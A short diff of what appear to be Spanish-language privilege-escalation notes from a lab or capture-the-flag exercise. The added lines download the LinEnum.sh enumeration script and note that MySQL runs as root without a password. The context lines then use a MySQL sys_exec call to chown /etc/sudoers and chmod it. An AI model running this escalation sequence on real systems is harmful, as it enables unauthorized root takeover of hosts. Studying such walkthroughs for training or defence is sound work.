@@ -80,6 +80,9 @@ more database.sql
 
   INSERT INTO `members` VALUES (1, 'john', '1234');
 
+wget https://raw.githubusercontent.com/monkeysm8/LinEnum/master/LinEnum.sh
+Vemos que mysql se ejecuta como root y sin contraseña
+
 mysql -uroot
 select sys_exec('chown USER:USER /etc/sudoers');
 chmod 0751 /etc/sudoers
